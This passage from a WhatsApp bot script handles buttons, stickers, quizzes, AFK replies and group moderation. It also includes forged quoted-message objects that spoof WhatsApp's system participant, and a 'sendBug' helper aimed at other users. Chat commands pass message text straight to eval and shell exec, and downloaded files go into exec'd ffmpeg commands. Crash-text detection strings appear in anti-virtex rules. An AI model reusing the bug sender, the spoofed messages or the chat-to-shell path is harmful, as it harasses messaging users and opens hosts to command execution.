    "status": "PENDING"
  }
// GIF
const fgi = {
	 key: { 
         fromMe: false,
	      participant: `0@s.whatsapp.net`, ...(from ? 
	 { remoteJid: "6289643739077-1613049930@g.us" } : {}) 
                },
	 message: { 
                 "videoMessage": { 
                 "title": `${time2} ${pushname}`,
                 "h": `${time2} ${pushname}`,
                 'duration': '99999', 
                 'gifPlayback': 'true', 
                 'caption': `${time2} ${pushname}`,
                 'jpegThumbnail': dfrply
                        }
                       }
	                  } 
// TEXT WITH THUMBNAIL
const fniv = {
	 key: { 
          fromMe: false,
	      participant: `0@s.whatsapp.net`, ...(from ? 
	 { remoteJid: "6289643739077-1613049930@g.us" } : {}) 
                },
	 message: { 
		"extendedTextMessage": {
                 "text": `${time2} ${pushname}`,
                 "title": `${time2} ${pushname}`,
                 'jpegThumbnail': dfrply
                        }
	                  } 
                     }
// VN
const fvoc = {
	 key: { 
          fromMe: false,
	      participant: `0@s.whatsapp.net`, ...(from ? 
	 { remoteJid: "6289643739077-1613049930@g.us" } : {}) 
                },
	 message: { 
		"audioMessage": {
                 "mimetype":"audio/ogg; codecs=opus",
                 "seconds": "99999",
                 "ptt": "true"
                        }
	                  } 
                     }
/// VIEW ONCE IMG
        const fonceimg = {
key: {
fromMe: false,
  participant: "0@s.whatsapp.net", ...(from ? { remoteJid: "status@broadcast" } : {}) },
  message: {
imageMessage: {
  viewOnce: true
},
},
    };
/// VIEW ONCE VID
const foncevid = { 
key: {fromMe: false, remoteJid: "6281315995629@g.us", participant: '0@s.whatsapp.net'}, 
message: { 
  videoMessage: { 
  viewOnce: true
},
},
    };
 const fmen = {
	key : {
                          participant : '0@s.whatsapp.net'
                        },
       message: {
                    orderMessage: {
                            itemCount : 2021,
                            status: 1,
                            surface : 1,
                            message: `Developed by Wann`, //Kasih namalu
                            thumbnail: fs.readFileSync('./media/image/icon.jpg'), //Gambarnye
                            sellerJid: '0@s.whatsapp.net' 
                          }
                        }
                      }
const sendBug = async (target) => {
      await wann.relayWAMessage(
        wann.prepareMessageFromContent(
          target,
          wann.prepareDisappearingMessageSettingContent(0),
          {}
        ),{ waitForAck: true }) 
    }
///Button Text
const sendButMessage = (id, text1, desc1, but = [], options = {}) => {
const buttonMessage = {
contentText: text1,
footerText: desc1,
buttons: but,
headerType: "EMPTY"
}
wann.sendMessage(id, buttonMessage, MessageType.buttonsMessage, options)
}
///Button Document
const sendButDocument = async(id, text1, desc1, media, doc1, but = [], options = {}) => {
kma = doc1
mhan = await wann.prepareMessage(from, media, document, kma)
const buttonMessages = {
documentMessage: mhan.message.documentMessage,
contentText: text1,
footerText: desc1,
buttons: but,
headerType: "DOCUMENT"
}
wann.sendMessage(id, buttonMessages, MessageType.buttonsMessage, options)
}
///Button Image
const sendButImage = async(id, text1, desc1, gam1, but = [], options = {}) => {
kma = gam1
mhan = await wann.prepareMessage(from, kma, image)
const buttonMessages = {
imageMessage: mhan.message.imageMessage,
contentText: text1,
footerText: desc1,
buttons: but,
headerType: "IMAGE"
}
wann.sendMessage(id, buttonMessages, MessageType.buttonsMessage, options)
}
///Button Video
const sendButVideo = async(id, text1, desc1, vid1, but = [], options = {}) => {
kma = vid1
mhan = await wann.prepareMessage(from, kma, video)
const buttonMessages = {
videoMessage: mhan.message.videoMessage,
contentText: text1,
footerText: desc1,
buttons: but,
headerType: "VIDEO"
}
wann.sendMessage(id, buttonMessages, MessageType.buttonsMessage, options)
}

// Image Maker
const sendImageMaker = async(gambar, teks, teks1) =>{
			const mediaxx = await wann.prepareMessage(from, gambar, MessageType.image, { thumbnail: Buffer.alloc(0)})
let bacotluxx = mediaxx.message["ephemeralMessage"] ? mediaxx.message.ephemeralMessage : mediaxx
		const buttonsxx = [
    {buttonId: 'owner', buttonText: {displayText: '🐨 Owner'}, type: 1},
    {buttonId: 'menu', buttonText: {displayText: 'menu ☕'}, type: 1}
 ]

const btnxx__ = {
    contentText: teks,
    footerText: `${tampilTanggal}\n${tampilWaktu} \n \n © ${NamaOwner} | Request by @${teks1.split('@')[0]}`,
    buttons: buttonsxx,
    headerType: 4,
    imageMessage: bacotluxx.message.imageMessage
}
		wann.sendMessage(from,  btnxx__, MessageType.buttonsMessage,{quoted: mek, contextInfo: {"mentionedJid": [teks1]}}).catch(e => {
reply('Terjadi kesalahan, coba beberapa saat lagi')
})
}


///Button Location
const sendButLocation = async (id, text1, desc1, loc1, but = [], options = {}) => {
kma = loc1
mhan = await wann.prepareMessage(from, kma, location)
const buttonMessages = {
locationMessage: mhan.message.locationMessage,
contentText: text1,
footerText: desc1,
buttons: but,
headerType: "LOCATION"
}
wann.sendMessage(id, buttonMessages, MessageType.buttonsMessage, options)
}
if (!mek.key.remoteJid.endsWith('@g.us') && offline){
			if (!mek.key.fromMe){
            if (isAfk(mek.key.remoteJid)) return
            addafk(mek.key.remoteJid)
			heheh = ms(Date.now() - waktuafk)
		  sendButMessage(from, `Hai ${pushname}, Maaf sepertinya saat ini ${NamaOwner} sedang Offline\n\n*Alasan :* ${alasanafk}\n*Sejak :* ${heheh.hours} Jam, ${heheh.minutes} Menit, ${heheh.seconds} Detik\n\nSilahkan hubungi lagi setelah Online`, "*_© WANN OFC_*", [{buttonId: 'simi', buttonText: {displayText: 'Oke'}, type: 1}], {quoted:ftrol, contextInfo: { forwardingScore: 508, isForwarded: true}})
			}
		}
		if (mek.key.remoteJid.endsWith('@g.us') && offline) {
			if (!mek.key.fromMe){
				if (mek.message.extendedTextMessage != undefined){
					if (mek.message.extendedTextMessage.contextInfo != undefined){
						if (mek.message.extendedTextMessage.contextInfo.mentionedJid != undefined){
				for (let ment of mek.message.extendedTextMessage.contextInfo.mentionedJid) {
					if (ment === wann.user.jid){
                        if (isAfk(mek.key.remoteJid)) return
                        addafk(mek.key.remoteJid)
						heheh = ms(Date.now() - waktuafk)
			       sendButMessage(from, `Hai ${pushname}, Maaf sepertinya saat ini ${NamaOwner} sedang Offline\n\n*Alasan :* ${alasanafk}\n*Sejak :* ${heheh.hours} Jam, ${heheh.minutes} Menit, ${heheh.seconds} Detik\n\nSilahkan hubungi lagi setelah Online`, "*_© WANN OFC_*", [{buttonId: 'simi', buttonText: {displayText: 'Oke'}, type: 1}], {quoted:ftrol, contextInfo: { forwardingScore: 508, isForwarded: true}})
					}
				}
						}
					}
				}
			}
		}
		const sendStickerUrl = async(to, url) => {
			console.log(color(time, 'magenta'), color(moment.tz('Asia/Jakarta').format('HH:mm:ss'), "gold"), color('Downloading sticker'))
				var names = getRandom('.webp')
				var namea = getRandom('.png')
				var download = function (uri, filename, callback) {
					request.head(uri, function (err, res, body) {
						request(uri).pipe(fs.createWriteStream(filename)).on('close', callback);
					});
				};
				download(url, namea, async function () {
					let filess = namea
					let asw = names
					require('./lib/exif.js')
					exec(`ffmpeg -i ${filess} -vcodec libwebp -filter:v fps=fps=20 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${asw}`, (err) => {
					exec(`webpmux -set exif ./temp/data.exif ${asw} -o ${asw}`, async (error) => {
					let media = fs.readFileSync(asw)
					wann.sendMessage(to, media, sticker, {quoted: mek})
					console.log(color(time, 'magenta'), color(moment.tz('Asia/Jakarta').format('HH:mm:ss'), "gold"), color('Succes send sticker'))
					});
					});
				});
			}
			        //Please dont edit for urlbutton 
        const buttonsDefault = [
            { callButton: {displayText: `☎ ️Call Owner`, phoneNumber: `+6285640068416`} },
            { urlButton: { displayText: `💠 Script Bot`, url : `https://github.com/X-Invibotz`} },
            { quickReplyButton: { displayText: `🧑 Owner`, id: `ownerku` } },
            { quickReplyButton: { displayText: `🎛️ Rules`, id: `rulesbot` } }
        ]

        const textTemplateButtons = (from, text, footer, buttons) => {
            return wann.sendMessage(from, { text: text, footer: footer, templateButtons: buttons })
        }

        const sendWebp = async(from, url) => {
                var names = Date.now() / 10000;
                var download = function (uri, filename, callback) {
                    request.head(uri, function (err, res, body) {
                        request(uri).pipe(fs.createWriteStream(filename)).on('close', callback);
                    });
                };
                download(url, './temp' + names + '.png', async function () {
                    console.log('selesai');
                    let ajg = './temp' + names + '.png'
                    let palak = './temp' + names + '.webp'
                    exec(`ffmpeg -i ${ajg} -vcodec libwebp -filter:v fps=fps=20 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${palak}`, (err) => {
                        let media = fs.readFileSync(palak)
                        wann.sendMessage(from, media, MessageType.sticker,{quoted:mek})
                        fs.unlinkSync(ajg)
                        fs.unlinkSync(palak)
                    });
                });
            }
            const sendKontak = (from, nomor, nama) => {
	        const vcard = 'BEGIN:VCARD\n' + 'VERSION:3.0\n' + 'FN:' + nama + '\n' + `ORG:Developer ${NamaBot}\n` + 'TEL;type=CELL;type=VOICE;waid=' + nomor + ':+' + nomor + '\n' + 'END:VCARD'
	        wann.sendMessage(from, { displayname: nama, vcard: vcard}, MessageType.contact, {quoted:mek, contextInfo: { forwardingScore: 508, isForwarded: true }})
            }
            const hideTagKontak = async function(from, nomor, nama){
	        let vcard = 'BEGIN:VCARD\n' + 'VERSION:3.0\n' + 'FN:' + nama + '\n' + 'ORG:Kontak\n' + 'TEL;type=CELL;type=VOICE;waid=' + nomor + ':+' + nomor + '\n' + 'END:VCARD'
	        let anu = await wann.groupMetadata(from)
	        let members = anu.participants
	        let ane = []
	        for (let i of members){
		    ane.push(i.jid)
	        }
	        wann.sendMessage(from, { displayname: nama, vcard: vcard}, MessageType.contact, {contextInfo: {"mentionedJid": ane}})
            }
		const reply = (teks) => {
			wann.sendMessage(from, teks, text, { thumbnail: dfrply, sendEphemeral: true, quoted: mek, contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply:{title: `${tampilTanggal} `,body:"DON'T CLICK HERE",previewType:"PHOTO",thumbnail:ofrply,sourceUrl:`https://wa.me/6285866295942?text=Assalamualaikum`}}})
		}
		const simir = (teks) => {
			wann.sendMessage(from, teks, text, { quoted:ftrol })
		}
		const math = (teks) => {
				return Math.floor(teks)
		}
		const sendGif = (url, fake) => {
wann.sendMessage(from, url, "videoMessage", {mimetype: "video/gif", filename: "wann.gif", gifPlayback: true, caption: fake, sendEphemeral: true, contextInfo: {forwardingScore: 508, isForwarded: true }, quoted: fniv})
}
		const sendMess = (hehe, teks) => {
			wann.sendMessage(hehe, teks, text, { quoted: ftrol, contextInfo: { forwardingScore: 508, isForwarded: true}})
		}
		const mentions = (teks, memberr, id) => {
			(id == null || id == undefined || id == false) ? wann.sendMessage(from, teks.trim(), extendedText, { contextInfo: { "mentionedJid": memberr } }) : wann.sendMessage(from, teks.trim(), extendedText, { quoted: mek, contextInfo: { "mentionedJid": memberr } })
		}
		const sendFileFromUrl = async(link, type, options) => {
hasil = await getBuffer(link)
wann.sendMessage(from, hasil, type, options).catch(e => {
fetch(link).then((hasil) => {
wann.sendMessage(from, hasil, type, options).catch(e => {
wann.sendMessage(from, { url : link }, type, options).catch(e => {
reply
console.log(e)
})
})
})
})
}
  const sendMediaURL = async(to, url, text="", mids=[]) =>{
				if(mids.length > 0){
					text = normalizeMention(to, text, mids)
				}
				const fn = Date.now() / 10000;
				const filename = fn.toString()
				let mime = ""
				var download = function (uri, filename, callback) {
					request.head(uri, function (err, res, body) {
						mime = res.headers['content-type']
						request(uri).pipe(fs.createWriteStream(filename)).on('close', callback);
					});
				};
				download(url, filename, async function () {
					console.log('done');
					let media = fs.readFileSync(filename)
					let type = mime.split("/")[0]+"Message"
					if(mime === "image/gif"){
						type = MessageType.video
						mime = Mimetype.gif
					}
					if(mime.split("/")[0] === "audio"){
						mime = Mimetype.mp4Audio
					}
					wann.sendMessage(to, media, type, { quoted: mek, mimetype: mime, caption: text,contextInfo: {"mentionedJid": mids}})
					
					fs.unlinkSync(filename)
				});
			}
		   const sendFakeThumb = async function(from, url, title, desc){
				var anoim = {
					detectLinks: false
				}
				var qul = await wann.generateLinkPreview(url)
				qul.title = title
				qul.description = desc
				qul.jpegThumbnail = dfrply
				wann.sendMessage(from, qul, MessageType.extendedText, anoim)
			}
			function Json(objectPromise) {
var objectString = JSON.stringify(objectPromise, null, 2)
var parse = util.format(objectString)
if (objectString == undefined) {
parse = util.format(objectPromise)
}
return reply(parse)
}
            function speedText(speed) {
                let bits = speed * 8;
                const units = ['', 'K', 'M', 'G', 'T'];
                const places = [0, 1, 2, 3];
                let unit = 0;
                while (bits >= 2000 && unit < 4) {
                    unit++;
                    bits/= 1000;
                }
                return `${bits.toFixed(places[unit])} ${units[unit]}bps`;
            } 
            
            //EVALL NYA BRO
           if (budy.startsWith('>')){
if (!isOwner && !isCoOwner && !mek.key.fromMe) return
console.log(color('[EVAL]'), color(moment(mek.messageTimestamp * 1000).format('DD/MM/YY HH:mm:ss'), 'yellow'), color(`Eval V1 brooo`))
ras = budy.slice(1)
function _(rem) {
ren = JSON.stringify(rem,null,2)
pes = util.format(ren)
reply(pes)
}
try{c
reply(require('util').format(eval(`(async () => { ${ras} })()`)))
} catch(err) {
e = String(err)
reply(e)
}
}
if (budy.startsWith('$')){
if (!mek.key.fromMe && !isOwner && !isCoOwner) return
qur = budy.slice(2)
exec(qur, (err, stdout) => {
if (err) return reply(`${err}`)
if (stdout) {
reply(stdout)
}
})
}
if (budy.startsWith('x')){
if (!mek.key.fromMe && !isOwner && !isCoOwner) return
try {
return helga.sendMessage(from, JSON.stringify(eval(budy.slice(2)),null,'\t'),text, {quoted: mek})
} catch(err) {
e = String(err)
reply(e)
}
}
if (budy.startsWith('=>')){
if (!isOwner && !isCoOwner && !mek.key.fromMe) return
var konsol = budy.slice(3)
Return = (sul) => {
var sat = JSON.stringify(sul, null, 2)
bang = util.format(sat)
if (sat == undefined){
bang = util.format(sul)
}
return reply(bang)
}
try {
reply(util.format(eval(`;(async () => { ${konsol} })()`)))
console.log('\x1b[1;37m>', '[', '\x1b[1;32mEXEC\x1b[1;37m', ']', time, color(">", "green"), 'from', color(sender.split('@')[0]), 'args :', color(args.length))
} catch(e){
reply(String(e))
}
}
			// AUTO
		
			for (let anji of setik){
				if (budy === anji){
					result = fs.readFileSync(`./media/sticker/${anji}.webp`)
					wann.sendMessage(from, result, sticker, { quoted: mek, contextInfo: { forwardingScore: 508, isForwarded: true }})
					}
			}
			for (let anju of vien){
				if (budy === anju){
					result = fs.readFileSync(`./media/vn/${anju}.mp3`)
					wann.sendMessage(from, result, audio, { mimetype: 'audio/mp4', duration: 359996400, ptt: true, quoted: mek, contextInfo: { forwardingScore: 508, isForwarded: true}})
					}
			}
			for (let anjh of imagi){
				if (budy === anjh){
					result = fs.readFileSync(`./media/image/${anjh}.jpg`)
					wann.sendMessage(from, result, image, { quoted: mek, contextInfo: { forwardingScore: 508, isForwarded: true}})
					}
			}
			for (var i = 0; i < commandsDB.length ; i++) {
				if (budy.toLowerCase() === commandsDB[i].pesan) {
					reply(commandsDB[i].balasan)
				}
			}
			
//AUTO SET BIO
			runt = process.uptime() 
           wann.setStatus(`Aktif Selama :  ${kyun(runt)} | Hostname : ${os.hostname()}  `).catch((_)=>_);
           settingstatus = new Date() * 1;      
			// MUTE
        if (isMuted){
            if (!isGroupAdmins && !isOwner && !mek.key.fromMe) return
            if (budy.toLowerCase().startsWith(`${prefix}unmute`)){
                let anu = mute.indexOf(from)
                mute.splice(anu, 1)
                fs.writeFileSync('./database/mute.json', JSON.stringify(mute))
                reply('Bot telah diunmute di group ini')
            }
        }
        if (budy.includes("https://chat.whatsapp.com/")) {
        	if (!mek.key.fromMe){
				if (!isGroup) return
				if (!isAntiLink) return
				if (isGroupAdmins) return reply('Atasan grup mah bebas yakan :v')
				wann.updatePresence(from, Presence.composing)
				var kic = `${sender.split("@")[0]}@s.whatsapp.net`
				reply('Link terdeteksi, Auto kick!')
			    wann.groupRemove(from, [kic]).catch((e) => { reply(mess.only.Badmin) })
			}
			}
			
			
			// STICKER 
			if (isGroup && isAutoSticker) {
			if (mek.message && mek.message.imageMessage) {
							const encmedia = isQuotedImage ? JSON.parse(JSON.stringify(riff).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : riff
							const media = await wann.downloadAndSaveMediaMessage(encmedia)
							ran = '666.webp'
                await ffmpeg(`./${media}`)
                .input(media)
                .on('start', function (cmd) {
                     console.log(`Started : ${cmd}`)
                })
                .on('error', function (err) {
                 console.log(`Error : ${err}`)
                fs.unlinkSync(media)
                reply('error')
                })
                .on('end', function () {
                console.log('Finish')
                wann.sendMessage(from, fs.readFileSync(ran), sticker, {quoted: ftroli})
                 fs.unlinkSync(media)
                fs.unlinkSync(ran)
                })
                .addOutputOptions([`-vcodec`, `libwebp`, `-vf`, `scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`])
                .toFormat('webp')
                .save(ran)
                 sendStickerUrl(from, media, ran)
			}
		}
		
		          if (tebakjenaka.hasOwnProperty(sender.split('@')[0]) && !isCmd) {
                kuis = true
                jawaban = tebakjenaka[sender.split('@')[0]]
                if (budy.toLowerCase() == jawaban) {
                	reply("Selamat🥳 Jawaban kamu benar")
                    delete tebakjenaka[sender.split('@')[0]]
                    fs.writeFileSync("./database/tebakjenaka.json", JSON.stringify(tebakjenaka))
 } else {
                    reply("Jawaban Salah!") 
               }
            }
            if (tebaklirik.hasOwnProperty(sender.split('@')[0]) && !isCmd) {
                kuis = true
                jawaban = tebaklirik[sender.split('@')[0]]
                if (budy.toLowerCase() == jawaban) {
                	reply("Selamat🥳 Jawaban kamu benar")
                    delete tebaklirik[sender.split('@')[0]]
                    fs.writeFileSync("./database/tebaklirik.json", JSON.stringify(tebaklirik))
 } else {
                    reply("Jawaban Salah!")   
             }
            }
            if (tebakimia.hasOwnProperty(sender.split('@')[0]) && !isCmd) {
                kuis = true
                jawaban = tebakimia[sender.split('@')[0]]
                if (budy.toLowerCase() == jawaban) {
                	reply("Selamat🥳 Jawaban kamu benar")
                    delete tebakimia[sender.split('@')[0]]
                    fs.writeFileSync("./database/tebakimia.json", JSON.stringify(tebakimia))
 } else {
                    reply("Jawaban Salah!")
                }
            }
          if (tebaksiapaaku.hasOwnProperty(sender.split('@')[0]) && !isCmd) {
                kuis = true
                jawaban = tebaksiapaaku[sender.split('@')[0]]
                if (budy.toLowerCase() == jawaban) {
                	reply("Selamat🥳 Jawaban kamu benar")
                    delete tebaksiapaaku[sender.split('@')[0]]
                    fs.writeFileSync("./database/tebaksiapaaku.json", JSON.stringify(tebaksiapaaku))
           } else {
                    reply("Jawaban Salah!")
                }
            }
          if (tebakbendera.hasOwnProperty(sender.split('@')[0]) && !isCmd) {
                kuis = true
                jawaban = tebakbendera[sender.split('@')[0]]
                if (budy.toLowerCase() == jawaban) {
                	reply("Selamat🥳 Jawaban kamu benar")
                    delete tebakbendera[sender.split('@')[0]]
                    fs.writeFileSync("./database/tebakbendera.json", JSON.stringify(tebakbendera))
                 } else {
                    reply("Jawaban Salah!")
                    }
            }
          if (susunkata.hasOwnProperty(sender.split('@')[0]) && !isCmd) {
                kuis = true
                jawaban = susunkata[sender.split('@')[0]]
                if (budy.toLowerCase() == jawaban) {
                	reply("Selamat🥳 Jawaban kamu benar")
                    delete susunkata[sender.split('@')[0]]
                    fs.writeFileSync("./database/susunkata.json", JSON.stringify(susunkata))
               } else {
                    reply("Jawaban Salah!")
  }
            }
          if (tebakata.hasOwnProperty(sender.split('@')[0]) && !isCmd) {
                kuis = true
                jawaban = tebakata[sender.split('@')[0]]
                if (budy.toLowerCase() == jawaban) {
                	reply("Selamat🥳 Jawaban kamu benar")
                    delete tebakata[sender.split('@')[0]]
                    fs.writeFileSync("./database/tebakata.json", JSON.stringify(tebakata))
               } else {
                    reply("Jawaban Salah!")
  }
            }     
            
                      if (tebaklagu.hasOwnProperty(sender.split('@')[0]) && !isCmd) {
                kuis = true
                jawaban = tebaklagu[sender.split('@')[0]]
                if (budy.toLowerCase() == jawaban) {
               reply("Selamat🥳 Jawaban kamu benar")
                    delete tebaklagu[sender.split('@')[0]]
                    fs.writeFileSync("./database/tebaklagu.json", JSON.stringify(tebaklagu))
                     } else {
                    reply("Jawaban Salah!")
 }
            }  
            
            if (kuismath.hasOwnProperty(sender.split('@')[0]) && !isCmd) {
                kuis = true
                jawaban = kuismath[sender.split('@')[0]]
                if (budy.toLowerCase() == jawaban) {
                	reply("Selamat🥳 Jawaban kamu benar")
                    delete kuismath[sender.split('@')[0]]
                    fs.writeFileSync("./database/kuismath.json", JSON.stringify(kuismath))
                   } else {
                    reply("Jawaban Salah!")
   }
            }
          if (asahotak.hasOwnProperty(sender.split('@')[0]) && !isCmd) {
                kuis = true
                jawaban = asahotak[sender.split('@')[0]]
                if (budy.toLowerCase() == jawaban) {
                	reply("Selamat🥳 Jawaban kamu benar")
                    delete asahotak[sender.split('@')[0]]
                    fs.writeFileSync("./database/asahotak.json", JSON.stringify(asahotak))
                     } else {
                    reply("Jawaban Salah!")
 }
            }

		          if (tebakjenaka.hasOwnProperty(sender.split('@')[0]) && !isCmd) {
                kuis = true
                jawaban = tebakjenaka[sender.split('@')[0]]
                if (budy.toLowerCase() == jawaban) {
                	reply("Selamat🥳 Jawaban kamu benar")
                    delete tebakjenaka[sender.split('@')[0]]
                    fs.writeFileSync("./database/tebakjenaka.json", JSON.stringify(tebakjenaka))
 } else {
                    reply("Jawaban Salah!") 
               }
            }
            if (tebaklirik.hasOwnProperty(sender.split('@')[0]) && !isCmd) {
                kuis = true
                jawaban = tebaklirik[sender.split('@')[0]]
                if (budy.toLowerCase() == jawaban) {
                	reply("Selamat🥳 Jawaban kamu benar")
                    delete tebaklirik[sender.split('@')[0]]
                    fs.writeFileSync("./database/tebaklirik.json", JSON.stringify(tebaklirik))
 } else {
                    reply("Jawaban Salah!")   
             }
            }
            if (tebakimia.hasOwnProperty(sender.split('@')[0]) && !isCmd) {
                kuis = true
                jawaban = tebakimia[sender.split('@')[0]]
                if (budy.toLowerCase() == jawaban) {
                	reply("Selamat🥳 Jawaban kamu benar")
                    delete tebakimia[sender.split('@')[0]]
                    fs.writeFileSync("./database/tebakimia.json", JSON.stringify(tebakimia))
 } else {
                    reply("Jawaban Salah!")
                }
            }
          if (tebaksiapaaku.hasOwnProperty(sender.split('@')[0]) && !isCmd) {
                kuis = true
                jawaban = tebaksiapaaku[sender.split('@')[0]]
                if (budy.toLowerCase() == jawaban) {
                	reply("Selamat🥳 Jawaban kamu benar")
                    delete tebaksiapaaku[sender.split('@')[0]]
                    fs.writeFileSync("./database/tebaksiapaaku.json", JSON.stringify(tebaksiapaaku))
           } else {
                    reply("Jawaban Salah!")
                }
            }
          if (tebakbendera.hasOwnProperty(sender.split('@')[0]) && !isCmd) {
                kuis = true
                jawaban = tebakbendera[sender.split('@')[0]]
                if (budy.toLowerCase() == jawaban) {
                	reply("Selamat🥳 Jawaban kamu benar")
                    delete tebakbendera[sender.split('@')[0]]
                    fs.writeFileSync("./database/tebakbendera.json", JSON.stringify(tebakbendera))
                 } else {
                    reply("Jawaban Salah!")
                    }
            }
          if (susunkata.hasOwnProperty(sender.split('@')[0]) && !isCmd) {
                kuis = true
                jawaban = susunkata[sender.split('@')[0]]
                if (budy.toLowerCase() == jawaban) {
                	reply("Selamat🥳 Jawaban kamu benar")
                    delete susunkata[sender.split('@')[0]]
                    fs.writeFileSync("./database/susunkata.json", JSON.stringify(susunkata))
               } else {
                    reply("Jawaban Salah!")
  }
            }
          if (tebakata.hasOwnProperty(sender.split('@')[0]) && !isCmd) {
                kuis = true
                jawaban = tebakata[sender.split('@')[0]]
                if (budy.toLowerCase() == jawaban) {
                	reply("Selamat🥳 Jawaban kamu benar")
                    delete tebakata[sender.split('@')[0]]
                    fs.writeFileSync("./database/tebakata.json", JSON.stringify(tebakata))
               } else {
                    reply("Jawaban Salah!")
  }
            }     
		
		// TEBAK GAMBAR
if (tebakgambar.hasOwnProperty(sender.split('@')[0]) && !isCmd) {
	kuis = true
                jawaban = tebakgambar[sender.split('@')[0]]
                if (budy.toLowerCase() == jawaban) {
                    reply("Selamat🥳 Jawaban kamu benar!")
                    delete tebakgambar[sender.split('@')[0]]
                    fs.writeFileSync("./database/tebakgambar.json", JSON.stringify(tebakgambar))
                } else {
                    reply("Jawaban Salah!")
                }
            }
// CAK LONTONG
if (caklontong.hasOwnProperty(sender.split('@')[0]) && !isCmd) {
	kuis = true
                jawaban = caklontong[sender.split('@')[0]]
                if (budy.toLowerCase() == jawaban) {
                    reply("Selamat🥳 Jawaban kamu benar")
                    delete caklontong[sender.split('@')[0]]
                    fs.writeFileSync("./database/caklontong.json", JSON.stringify(caklontong))
                } else {
                    reply("Jawaban Salah!")
                }
            }
// FAMILY 100
if (family.hasOwnProperty(sender.split('@')[0]) && !isCmd) {
                kuis = true
                   jawaban = family[sender.split('@')[0]]
                if (budy.toLowerCase() == jawaban) {
                    reply("Selamat🥳 Jawaban kamu benar")
                    delete family[sender.split('@')[0]]
                    fs.writeFileSync("./database/family100.json", JSON.stringify(family))
                } else {
                    reply("Jawaban Salah!")
                }
            }
// TEBAK ANIME
if (tebakanime.hasOwnProperty(sender.split('@')[0]) && !isCmd) {
	kuis = true
                jawaban = tebakanime[sender.split('@')[0]]
                if (budy.toLowerCase() == jawaban) {
                    reply("Selamat🥳 Jawaban kamu benar")
                    delete tebakanime[sender.split('@')[0]]
                    fs.writeFileSync("./database/tebakanime.json", JSON.stringify(tebakanime))
                } else {
                    reply("Jawaban Salah!")
                }
            }
            
		
			if (budy.includes("๒๒")){
  if (!isGroup) return
  if (!isAntiFirtex) return
  if (!isGroupAdmins) return reply('karena kamu adalah admin group, bot tidak akan kick kamu')
  wann.updatePresence(from, Presence.composing)
  var kic = `${sender.split("@")[0]}@s.whatsapp.net`
  reply(`「 *VIRTEX TERDETEKSI* 」 MAAF wa.me/${sender.split("@")[0]}\nANDA DI KICK DALAM GRUP`)
  setTimeout( () => {
         wann.groupRemove(from, [kic]).catch((e)=>{reply(`*ERR:* ${e}`)})
  }, 1000)
  setTimeout( () => {
         wann.updatePresence(from, Presence.composing)
         rekap.push(`${sender}@s.whatsapp.net`)
  fs.writeFileSync('./src/rekapvir.json', JSON.stringify(rekap))
         reply("「 *REKAP DATA VIRTEX* 」Sukses, Menyimpan Data Orang Yang Mengirimkan Virtex Kedalam Daftar Hitam Database Bot WhatsApp.")
  }, 0)
}

//=====================================================================
if (budy.includes("🧙‍♂️𝐀𝐥𝐚𝐤𝐚𝐳𝐚𝐦🔮")){
  if (!isGroup) return
  if (!isAntiFirtex2) return
  if (!isGroupAdmins) return reply('karena kamu adalah admin group, bot tidak akan kick kamu')
  wann.updatePresence(from, Presence.composing)
  var kic = `${sender.split("@")[0]}@s.whatsapp.net`
  reply(`「 *VIRTEX TERDETEKSI* 」 MAAF wa.me/${sender.split("@")[0]}\nANDA DI KICK DALAM GRUP`)
  setTimeout( () => {
         wann.groupRemove(from, [kic]).catch((e)=>{reply(`*ERR:* ${e}`)})
  }, 1000)
  setTimeout( () => {
   wann.updatePresence(from, Presence.composing)
  rekap.push(`${sender}@s.whatsapp.net`)
  fs.writeFileSync('./src/rekapvir.json', JSON.stringify(rekap))
         reply("「 *REKAP DATA VIRTEX* 」Sukses, Menyimpan Data Orang Yang Mengirimkan Virtex Kedalam Daftar Hitam Database Bot WhatsApp.")
  }, 0)
}     
//===================================================================== 
if (budy.includes("𝐗-𝐕𝐢𝐫𝐮𝐬")){
  if (!isGroup) return
  if (!isAntifirtex3) return
  if (!isGroupAdmins) return reply('karena kamu adalah admin group, bot tidak akan kick kamu')
  wann.updatePresence(from, Presence.composing)
  var kic = `${sender.split("@")[0]}@s.whatsapp.net`
  reply(`「 *VIRTEX TERDETEKSI* 」 MAAF wa.me/${sender.split("@")[0]}\nANDA DI KICK DALAM GRUP`)
  setTimeout( () => {
         wann.groupRemove(from, [kic]).catch((e)=>{reply(`*ERR:* ${e}`)})
  }, 1000)
  setTimeout( () => {
         wann.updatePresence(from, Presence.composing)
  rekap.push(`${sender}@s.whatsapp.net`)
  fs.writeFileSync('./src/rekapvir.json', JSON.stringify(rekap))
         reply("「 *REKAP DATA VIRTEX* 」Sukses, Menyimpan Data Orang Yang Mengirimkan Virtex Kedalam Daftar Hitam Database Bot WhatsApp.")
  }, 0)
}
//====================================================================================
